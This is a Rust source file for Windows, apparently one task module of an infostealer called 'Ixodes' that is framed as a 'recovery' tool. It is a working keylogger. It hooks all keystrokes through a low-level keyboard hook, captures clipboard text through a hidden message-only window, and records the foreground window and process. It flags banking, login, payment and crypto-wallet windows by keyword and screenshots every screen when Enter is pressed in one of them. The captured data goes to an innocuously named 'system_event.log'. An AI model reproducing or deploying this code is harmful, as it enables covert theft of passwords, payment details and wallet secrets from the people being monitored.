use crate::recovery::context::RecoveryContext;
#[cfg(feature = "screenshot")]
use crate::recovery::screenshot;
#[cfg(feature = "screenshot")]
use crate::recovery::storage::output::write_binary_artifact;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use once_cell::sync::Lazy;
use std::sync::mpsc::{Receiver, Sender, channel};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};
use tokio::time::interval;
use tracing::error;
use windows::Win32::Foundation::{HGLOBAL, HINSTANCE, HMODULE, HWND, LPARAM, LRESULT, WPARAM};
use windows::Win32::System::DataExchange::{
    AddClipboardFormatListener, CloseClipboard, GetClipboardData, OpenClipboard,
};
use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows::Win32::System::ProcessStatus::GetModuleBaseNameW;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::*;

static KEY_LOG_BUFFER: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));

const CF_UNICODETEXT: u32 = 13;
const WM_CLIPBOARDUPDATE: u32 = 0x031D;

pub struct KeyloggerTask;

enum LogEvent {
    Key(u32),
    Clipboard,
}

static EVENT_SENDER: Lazy<Mutex<Option<Sender<LogEvent>>>> = Lazy::new(|| Mutex::new(None));

#[async_trait]
impl RecoveryTask for KeyloggerTask {
    fn label(&self) -> String {
        "Ixodes Advanced Surveillance".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let log_file_path = ctx.output_dir.join("system_event.log");
        let (tx, rx) = channel();

        {
            let mut sender_lock = EVENT_SENDER.lock().unwrap();
            *sender_lock = Some(tx);
        }

        let buffer = KEY_LOG_BUFFER.clone();
        let ctx_clone = ctx.clone();
        std::thread::spawn(move || {
            run_event_processor(rx, buffer, ctx_clone);
        });

        std::thread::spawn(move || {
            install_hook_and_listener();
        });

        let flush_path = log_file_path.clone();
        let flush_buffer = KEY_LOG_BUFFER.clone();

        tokio::spawn(async move {
            let mut interval = interval(Duration::from_secs(10));
            loop {
                interval.tick().await;
                let content = {
                    let mut lock = flush_buffer.lock().unwrap();
                    if lock.is_empty() {
                        continue;
                    }
                    let data = lock.clone();
                    lock.clear();
                    data
                };

                use tokio::io::AsyncWriteExt;
                let file = tokio::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&flush_path)
                    .await;

                if let Ok(mut f) = file {
                    let _ = f.write_all(content.as_bytes()).await;
                }
            }
        });

        Ok(vec![RecoveryArtifact {
            label: "Surveillance Log".to_string(),
            path: log_file_path,
            size_bytes: 0,
            modified: Some(SystemTime::now()),
        }])
    }
}

fn install_hook_and_listener() {
    unsafe {
        let h_instance = HMODULE::default();

        let hook_result = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), h_instance, 0);

        let hook_id = match hook_result {
            Ok(h) => h,
            Err(e) => {
                error!("failed to install keyboard hook: {}", e);
                return;
            }
        };

        let class_name = windows::core::w!("IxodesMsgClass");
        let wnd_class = WNDCLASSW {
            lpfnWndProc: Some(window_proc),
            hInstance: HINSTANCE(h_instance.0),
            lpszClassName: class_name,
            ..Default::default()
        };

        RegisterClassW(&wnd_class);

        let hwnd = CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            class_name,
            windows::core::w!("IxodesMsgWindow"),
            WINDOW_STYLE::default(),
            0,
            0,
            0,
            0,
            HWND_MESSAGE,
            HMENU::default(),
            h_instance,
            None,
        );

        if hwnd.0 != 0 {
            let _ = AddClipboardFormatListener(hwnd);
        }

        let mut msg = MSG::default();
        while GetMessageW(&mut msg, HWND::default(), 0, 0).as_bool() {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        let _ = UnhookWindowsHookEx(hook_id);
    }
}

unsafe extern "system" fn hook_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && wparam.0 == WM_KEYDOWN as usize {
        unsafe {
            let kbd_struct = *(lparam.0 as *const KBDLLHOOKSTRUCT);
            if let Some(tx) = EVENT_SENDER.lock().unwrap().as_ref() {
                let _ = tx.send(LogEvent::Key(kbd_struct.vkCode));
            }
        }
    }
    unsafe { CallNextHookEx(HHOOK::default(), code, wparam, lparam) }
}

unsafe extern "system" fn window_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    if msg == WM_CLIPBOARDUPDATE {
        if let Some(tx) = EVENT_SENDER.lock().unwrap().as_ref() {
            let _ = tx.send(LogEvent::Clipboard);
        }
        return LRESULT(0);
    }
    unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
}

fn run_event_processor(rx: Receiver<LogEvent>, buffer: Arc<Mutex<String>>, ctx: RecoveryContext) {
    let mut last_window = String::new();
    let mut last_clipboard = String::new();
    let mut is_sensitive = false;

    while let Ok(event) = rx.recv() {
        match event {
            LogEvent::Key(vk) => {
                let (title, process) = get_foreground_info();
                let current_window = format!("[{}] {}", process, title);

                let mut log_entry = String::new();
                if current_window != last_window {
                    let time = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                    is_sensitive = check_sensitivity(&title, &process);
                    let marker = if is_sensitive {
                        " [!!! SENSITIVE !!!]"
                    } else {
                        ""
                    };
                    log_entry.push_str(&format!(
                        "\n\n--- Window: {}{}{} ---\n",
                        current_window, marker, time
                    ));
                    last_window = current_window;
                }

                if is_sensitive && vk == 0x0D {
                    trigger_screenshot(&ctx);
                }

                let key_str = map_key(vk);
                if !key_str.is_empty() {
                    log_entry.push_str(&key_str);
                    let mut lock = buffer.lock().unwrap();
                    lock.push_str(&log_entry);
                }
            }
            LogEvent::Clipboard => {
                if let Some(text) = get_clipboard_text() {
                    if text != last_clipboard && !text.trim().is_empty() {
                        let time = chrono::Local::now().format("%H:%M:%S");
                        let log =
                            format!("\n\n[CLIPBOARD @ {}]\n{}\n[END CLIPBOARD]\n", time, text);
                        let mut lock = buffer.lock().unwrap();
                        lock.push_str(&log);
                        last_clipboard = text;
                    }
                }
            }
        }
    }
}

fn check_sensitivity(title: &str, process: &str) -> bool {
    let keywords = [
        "login",
        "signin",
        "bank",
        "crypto",
        "wallet",
        "password",
        "passphrase",
        "checkout",
        "payment",
        "card",
        "vault",
        "auth",
        "mfa",
        "2fa",
        "binance",
        "coinbase",
        "metamask",
        "kraken",
        "paypal",
        "stripe",
    ];
    let lower_title = title.to_lowercase();
    let lower_process = process.to_lowercase();

    keywords
        .iter()
        .any(|&k| lower_title.contains(k) || lower_process.contains(k))
}

fn trigger_screenshot(ctx: &RecoveryContext) {
    #[cfg(feature = "screenshot")]
    {
        let captures = screenshot::capture_all_screens();
        if captures.is_empty() {
            return;
        }

        let ctx_clone = ctx.clone();
        tokio::spawn(async move {
            for capture in captures {
                let name = format!(
                    "sensitive-{}-{}.png",
                    SystemTime::now()
                        .duration_since(SystemTime::UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_secs(),
                    capture.index
                );
                let _ = write_binary_artifact(
                    &ctx_clone,
                    RecoveryCategory::System,
                    "Surveillance",
                    &name,
                    &capture.png_bytes,
                )
                .await;
            }
        });
    }
    #[cfg(not(feature = "screenshot"))]
    {
        let _ = ctx;
    }
}
fn get_foreground_info() -> (String, String) {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.0 == 0 {
            return ("Unknown".to_string(), "Unknown".to_string());
        }

        let len = GetWindowTextLengthW(hwnd);
        let title = if len > 0 {
            let mut buf = vec![0u16; (len + 1) as usize];
            GetWindowTextW(hwnd, &mut buf);
            String::from_utf16_lossy(&buf[..len as usize])
        } else {
            "No Title".to_string()
        };

        let mut process_id = 0;
        GetWindowThreadProcessId(hwnd, Some(&mut process_id));

        let process_name = if process_id != 0 {
            let process_handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                false,
                process_id,
            );

            if let Ok(h_proc) = process_handle {
                let mut mod_buf = [0u16; 260];
                let success = GetModuleBaseNameW(h_proc, HMODULE::default(), &mut mod_buf);
                let _ = windows::Win32::Foundation::CloseHandle(h_proc);

                if success > 0 {
                    let end = mod_buf
                        .iter()
                        .position(|&c| c == 0)
                        .unwrap_or(mod_buf.len());
                    String::from_utf16_lossy(&mod_buf[..end])
                } else {
                    "Unknown".to_string()
                }
            } else {
                "System".to_string()
            }
        } else {
            "System".to_string()
        };

        (title, process_name)
    }
}

fn map_key(vk: u32) -> String {
    match vk {
        0x08 => return "[BKSP]".to_string(),
        0x0D => return "\n".to_string(),
        0x20 => return " ".to_string(),
        0x09 => return "[TAB]".to_string(),
        0x1B => return "[ESC]".to_string(),
        0x2E => return "[DEL]".to_string(),
        0x25 => return "[LEFT]".to_string(),
        0x26 => return "[UP]".to_string(),
        0x27 => return "[RIGHT]".to_string(),
        0x28 => return "[DOWN]".to_string(),
        0x10 | 0xA0 | 0xA1 | 0x11 | 0xA2 | 0xA3 | 0x12 | 0xA4 | 0xA5 => return String::new(),
        _ => {}
    }

    unsafe {
        let mut state = [0u8; 256];
        let _ = GetKeyboardState(&mut state);

        let mut buf = [0u16; 16];
        let scan_code = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);

        let result = ToUnicode(vk, scan_code, Some(&state), &mut buf, 0);

        if result > 0 {
            let s = String::from_utf16_lossy(&buf[..result as usize]);
            if (state[VK_CONTROL.0 as usize] & 0x80) != 0 {
                return format!("[CTRL+{}]", s.to_uppercase());
            }
            s
        } else if result == -1 {
            String::new()
        } else {
            if vk >= 0x70 && vk <= 0x87 {
                format!("[F{}]", vk - 0x6F)
            } else {
                String::new()
            }
        }
    }
}

fn get_clipboard_text() -> Option<String> {
    unsafe {
        if OpenClipboard(HWND::default()).is_ok() {
            let h_data_result = GetClipboardData(CF_UNICODETEXT);
            if let Ok(h_data) = h_data_result {
                if h_data.0 != 0 {
                    let h_global = HGLOBAL(h_data.0 as *mut std::ffi::c_void);
                    let ptr = GlobalLock(h_global);
                    if !ptr.is_null() {
                        let len = (0..)
                            .take_while(|&i| *ptr.cast::<u16>().add(i) != 0)
                            .count();
                        let slice = std::slice::from_raw_parts(ptr.cast::<u16>(), len);
                        let text = String::from_utf16_lossy(slice);
                        let _ = GlobalUnlock(h_global);
                        let _ = CloseClipboard();
                        return Some(text);
                    }
                }
            }
            let _ = CloseClipboard();
        }
    }
    None
}
